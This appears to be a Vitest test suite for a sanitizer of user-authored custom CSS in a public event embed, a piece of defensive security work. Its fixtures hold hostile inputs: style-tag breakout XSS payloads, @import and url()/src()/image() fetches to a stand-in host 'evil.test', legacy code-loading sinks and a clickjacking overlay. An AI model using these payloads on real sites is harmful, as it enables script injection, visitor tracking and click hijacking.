// `Extra CSS Code`, sanitized. The hostile-input suite for the one field on this surface that
// an admin authors and a stranger's visitors execute.
//
// Every case here is an attack the reference's own copy invites: "Sessionboard doesn't validate
// or provide custom code support" is a product decision we cannot copy, because our embed is
// served from OUR origin to a visitor on somebody else's website. The threat model is the one
// tests/safe-html.test.ts already established for stored HTML, and the important half of it is
// that the write boundary is worthless: an event admin is a customer, not the operator, and the
// Airtable cell is writable directly, so the editor's textarea is not between an attacker and
// the `<style>` element.
//
// Four properties are pinned, in order of how badly they fail:
//
//   1. `</style>` cannot terminate the block. Inside a `<style>` element the HTML tokenizer
//      knows nothing about CSS strings or comments, so `content: "</style><script>"` is a real
//      breakout and the only reliable answer is that no `<` survives at all.
//   2. Nothing fetches a remote URL. `@import` and every `url()` are refused, so an embed
//      cannot phone home, cannot pull in arbitrary further CSS, and cannot leak a visitor's IP
//      or the fact that they loaded the page.
//   3. The output is brace-balanced whatever the input was, so a truncated or crafted blob
//      cannot leave the `<style>` element holding an open rule that swallows the page.
//   4. Legitimate CSS still works, because a sanitizer that eats ordinary declarations gets
//      widened back into uselessness by the next person who needs one.

import { readFile } from 'node:fs/promises'
import { describe, expect, it } from 'vitest'

import { safeEmbedCss, safeStoredEmbedCss } from '@/features/cms/safe-css'

describe('safeEmbedCss, breaking out of the style element', () => {
  it('removes every angle bracket open, so a closing style tag cannot terminate the block', () => {
    const out = safeEmbedCss('.a { color: red } </style><script>alert(1)</script>')

    expect(out).not.toContain('<')
    expect(out).not.toContain('script')
  })

  it('removes a closing style tag hidden inside a CSS string', () => {
    // The HTML tokenizer does not know this is a CSS string, so quoting is not protection.
    const out = safeEmbedCss('.a::after { content: "</style><img src=x onerror=alert(1)>" }')

    // The payload survives as inert TEXT inside the CSS string, and that is the correct outcome:
    // with no `<` left there is no tag for a browser to build out of it, and rewriting the
    // organizer's string content would be a guess about what they meant.
    expect(out).not.toContain('<')
    expect(out).toBe('.a::after{content:"/style>img src=x onerror=alert(1)>";}')
  })

  it('removes a closing style tag hidden inside a comment', () => {
    const out = safeEmbedCss('/* </style><script>alert(1)</script> */ .a { color: red }')

    expect(out).not.toContain('<')
    expect(out).toContain('color:red')
  })

  it('drops an HTML comment opener', () => {
    expect(safeEmbedCss('<!-- .a { color: red } -->')).not.toContain('<')
  })
})

describe('safeEmbedCss, remote fetches', () => {
  it('refuses an @import', () => {
    const out = safeEmbedCss("@import url('https://evil.test/x.css');\n.a { color: red }")

    expect(out).not.toContain('import')
    expect(out).not.toContain('evil.test')
    expect(out).toContain('color:red')
  })

  it('refuses an @import written without url()', () => {
    expect(safeEmbedCss('@import "https://evil.test/x.css";')).toBe('')
  })

  it('refuses an @import whose name is written in mixed case', () => {
    expect(safeEmbedCss('@IMPORT url(https://evil.test/x.css);')).toBe('')
  })

  it('drops a declaration that fetches a background image', () => {
    // The whole rule goes, because a rule left with no declarations is not a rule.
    expect(safeEmbedCss('.a { background: url(https://evil.test/pixel.png) }')).toBe('')
  })

  it('drops a url() while keeping the declarations beside it', () => {
    const out = safeEmbedCss('.a { color: red; background-image: url(x.png); font-weight: 700 }')

    expect(out).toContain('color:red')
    expect(out).toContain('font-weight:700')
    expect(out).not.toContain('url')
  })

  it('drops a url() hidden behind whitespace before the paren', () => {
    expect(safeEmbedCss('.a { background: url  (https://evil.test/p.png) }')).toBe('')
  })

  it('drops a value carrying a CSS escape, which is how url gets spelled around a filter', () => {
    expect(safeEmbedCss('.a { background: \\75 rl(https://evil.test/p.png) }')).toBe('')
  })

  it('drops image-set, which fetches exactly like url', () => {
    expect(safeEmbedCss('.a { background: image-set("a.png" 1x) }')).toBe('')
  })

  it('drops a @font-face block whole, since a webfont is a fetch', () => {
    const out = safeEmbedCss('@font-face { font-family: x; src: url(https://evil.test/f.woff) }')

    expect(out).toBe('')
  })

  it('refuses @charset and @namespace', () => {
    expect(safeEmbedCss('@charset "utf-8";')).toBe('')
    expect(safeEmbedCss('@namespace url(http://evil.test/ns);')).toBe('')
  })

  it('drops the legacy IE expression() sink', () => {
    expect(safeEmbedCss('.a { width: expression(alert(1)) }')).toBe('')
  })

  it('drops behavior and -moz-binding, both of which load code', () => {
    expect(safeEmbedCss('.a { behavior: xyz; -moz-binding: xyz }')).toBe('')
  })
})

describe('safeEmbedCss, structure', () => {
  it('balances braces when the input leaves a rule open', () => {
    const out = safeEmbedCss('.a { color: red')

    expect(out).toBe('.a{color:red;}')
    expect(countOf(out, '{')).toBe(countOf(out, '}'))
  })

  it('drops a stray closing brace rather than emitting it', () => {
    const out = safeEmbedCss('} .a { color: red }')

    expect(countOf(out, '{')).toBe(countOf(out, '}'))
    expect(out).toContain('color:red')
  })

  it('drops an empty rule', () => {
    expect(safeEmbedCss('.a { }')).toBe('')
  })

  it('drops a declaration sitting outside any rule', () => {
    expect(safeEmbedCss('color: red;')).toBe('')
  })

  it('refuses a selector carrying characters no selector needs', () => {
    // A backslash escape in a selector is legal CSS and refused here anyway: nothing an
    // organizer types needs one, and it is how every other filter on this page gets bypassed.
    expect(safeEmbedCss('.a\\7b { color: red }')).toBe('')
  })

  it('stops recursing at a nesting depth no hand-written stylesheet reaches', () => {
    const deep = `${'@media screen {'.repeat(12)}.a { color: red }${'}'.repeat(12)}`

    const out = safeEmbedCss(deep)
    expect(countOf(out, '{')).toBe(countOf(out, '}'))
  })

  it('caps the stored blob, so one cell cannot pad every served page', () => {
    const out = safeEmbedCss(`.a { color: red }${'.b{color:blue}'.repeat(4000)}`)

    // The cap is enforced by dropping whole rules, so the output settles just past 20 KB rather
    // than exactly on it. Cutting to the byte would emit half a declaration.
    expect(out.length).toBeLessThan(20_100)
    expect(countOf(out, '{')).toBe(countOf(out, '}'))
  })
})

describe('safeEmbedCss, legitimate CSS', () => {
  it('keeps a plain rule, normalised', () => {
    expect(safeEmbedCss('.someClass {\n  color:   red;\n}')).toBe('.someClass{color:red;}')
  })

  it('keeps a media query and the rules inside it', () => {
    const out = safeEmbedCss('@media (min-width: 640px) { .a { padding: 1rem } }')

    expect(out).toBe('@media (min-width: 640px){.a{padding:1rem;}}')
  })

  it('keeps @supports and @layer', () => {
    expect(safeEmbedCss('@supports (display: grid) { .a { display: grid } }')).toContain(
      '@supports',
    )
    expect(safeEmbedCss('@layer x { .a { color: red } }')).toContain('@layer')
  })

  it('keeps a custom property with its case intact', () => {
    expect(safeEmbedCss('.a { --Brand-Gap: 4px }')).toBe('.a{--Brand-Gap:4px;}')
  })

  it('keeps a vendor-prefixed property and an !important', () => {
    const out = safeEmbedCss('.a { -webkit-font-smoothing: antialiased; color: red !important }')

    expect(out).toContain('-webkit-font-smoothing:antialiased')
    expect(out).toContain('color:red !important')
  })

  it('keeps a compound selector with a child combinator and a pseudo class', () => {
    const out = safeEmbedCss('.a > .b:not(.c):nth-child(2n + 1) { color: red }')

    expect(out).toContain('.a > .b:not(.c):nth-child(2n + 1)')
  })

  it('keeps a nested rule inside a rule', () => {
    const out = safeEmbedCss('.a { color: red; &:hover { color: blue } }')

    expect(out).toContain('color:red')
    expect(out).toContain('&:hover{color:blue;}')
  })

  it('keeps a font stack with quotes and commas', () => {
    const out = safeEmbedCss(`.a { font-family: "Helvetica Neue", Arial, sans-serif }`)

    expect(out).toContain('font-family:"Helvetica Neue", Arial, sans-serif')
  })
})

describe('safeStoredEmbedCss, the DAL boundary form', () => {
  it('passes an absent column through as absent', () => {
    expect(safeStoredEmbedCss(undefined)).toBeUndefined()
  })

  it('reads an all-hostile blob as no custom CSS at all', () => {
    // Not an empty string: the renderer skips the style element entirely when there is nothing
    // to put in it, and "" would still emit `<style></style>` on every served page.
    expect(safeStoredEmbedCss('@import url(https://evil.test/x.css);')).toBeUndefined()
  })

  it('sanitizes a blob that has something legitimate in it', () => {
    expect(safeStoredEmbedCss('.a { color: red } </style>')).toBe('.a{color:red;}')
  })
})

describe('placement', () => {
  it('is called from the CmsEmbeds mapper, at the DAL read boundary', async () => {
    const mapper = await readFile('src/services/airtable/mapping-cms.ts', 'utf8')

    expect(mapper).toContain('safeStoredEmbedCss')
  })

  it('is not imported by the render sinks, which would put it on a public render path', async () => {
    // The `<style>` element in EmbedFrame is the sink. It receives a value the mapper has already
    // sanitized, and a second call there would suggest the read boundary is not the guarantee.
    // Matched on the IMPORT rather than on the module name, because both files name it in a comment.
    for (const path of ['src/features/cms/EmbedFrame.tsx', 'src/features/cms/EmbedViews.tsx']) {
      expect(await readFile(path, 'utf8')).not.toMatch(/^import .*safe-css/mu)
    }
  })
})

function countOf(value: string, character: string): number {
  return value.split(character).length - 1
}

describe('safeEmbedCss, the fetching functions that are not spelled url()', () => {
  // `url(` was filtered and its two synonyms were not, which is one hole with three spellings.
  // CSS Values 4 defines `src()` as a url function taking a STRING, and CSS Images 4 lets
  // `image()` take one, so either fetches from an attacker's host on a public page and reports
  // every visitor's IP without the string `url(` appearing anywhere. Found by Codex review.
  it('refuses src(), which is url() under a newer name', () => {
    expect(safeEmbedCss('.a{background:src("https://evil.test/x.png")}')).toBe('')
  })

  it('refuses image(), which takes a bare string URL', () => {
    expect(safeEmbedCss('.a{background:image("https://evil.test/x.png")}')).toBe('')
  })

  it('still refuses image-set(), whose hyphen stops the image( pattern matching', () => {
    expect(safeEmbedCss('.a{background:image-set("https://evil.test/x.png" 1x)}')).toBe('')
  })

  it('refuses them however they are spaced or cased', () => {
    expect(safeEmbedCss('.a{background:SRC ("https://evil.test/x")}')).toBe('')
    expect(safeEmbedCss('.a{background:Image\t("https://evil.test/x")}')).toBe('')
  })

  it('keeps a gradient, which contains "image" in its property and fetches nothing', () => {
    const out = safeEmbedCss('.a{background-image:linear-gradient(#fff,#000)}')

    expect(out).toContain('linear-gradient')
  })
})

describe('safeEmbedCss, the viewport overlay', () => {
  // `position: fixed` is measured against the viewport rather than the embed's box, so the feed's
  // own footer link becomes an invisible full-page overlay that swallows every click. Inside an
  // iframe on the organizer's own site that is their business; opened top-level at
  // /embed/{publicId} it is a clickjack served from our origin. Found by Codex review.
  it('refuses position: fixed', () => {
    expect(safeEmbedCss('a{position:fixed;inset:0;opacity:0;z-index:2147483647}')).not.toContain(
      'position',
    )
  })

  it('refuses it behind !important and extra whitespace', () => {
    expect(safeEmbedCss('a{position:   FIXED !important}')).toBe('')
  })

  it('refuses sticky for the same reason at a smaller scale', () => {
    expect(safeEmbedCss('a{position:sticky;top:0}')).not.toContain('position')
  })

  it('keeps relative and absolute, which a badge inside the embed needs', () => {
    expect(safeEmbedCss('.card{position:relative}')).toContain('position:relative')
    expect(safeEmbedCss('.badge{position:absolute;top:0}')).toContain('position:absolute')
  })

  it('drops only the position declaration, not its neighbours', () => {
    const out = safeEmbedCss('a{color:red;position:fixed;font-weight:700}')

    expect(out).toContain('color:red')
    expect(out).toContain('font-weight:700')
    expect(out).not.toContain('fixed')
  })
})

describe('safeEmbedCss, unclosed functions', () => {
  // The balance guarantee covered braces and not function delimiters, so `.a{color:rgb(0}` was
  // re-serialised as `.a{color:rgb(0;}` and a CSS parser consumed the closing brace and every
  // later rule into the unterminated function: one truncated declaration silently swallowed the
  // rest of the stylesheet. Found by Codex review.
  it('refuses a declaration with an unclosed function instead of emitting it', () => {
    const out = safeEmbedCss('.x{color:rgb(0}.y{display:block}')

    expect(out).not.toContain('rgb(0')
    // The rule that used to be swallowed survives, which is the point.
    expect(out).toContain('display:block')
  })

  it('refuses a stray closing paren, which is the same defect mirrored', () => {
    expect(safeEmbedCss('.x{color:red)}.y{display:block}')).not.toContain('color:red)')
  })

  it('refuses unbalanced brackets too', () => {
    expect(safeEmbedCss('.x{grid-template-areas:[a}')).toBe('')
  })

  it('keeps a legitimately nested function', () => {
    const out = safeEmbedCss('.x{width:calc(100% - min(2rem, 4vw))}')

    expect(out).toContain('calc(100% - min(2rem, 4vw))')
  })
})
